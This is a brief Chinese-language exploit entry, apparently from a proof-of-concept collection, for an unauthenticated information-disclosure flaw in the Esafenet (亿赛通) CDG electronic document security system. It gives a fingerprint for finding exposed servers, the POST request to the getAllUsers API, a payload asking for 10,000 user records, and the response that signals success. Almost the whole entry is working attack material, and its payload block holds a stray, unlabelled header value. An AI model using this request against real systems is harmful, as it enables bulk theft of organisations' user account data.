# 亿赛通电子文档安全管理系统getAllUsers信息泄露漏洞

亿赛通电子文档安全管理系统getAllUsers ｜ 信息泄露 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/openapi/getAllUsers HTTP/1.1`

**Payload**
```
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/x-www-form-urlencoded
pageSize=10000&pageNumber=1
```
- **响应特征**：200 “code”: 0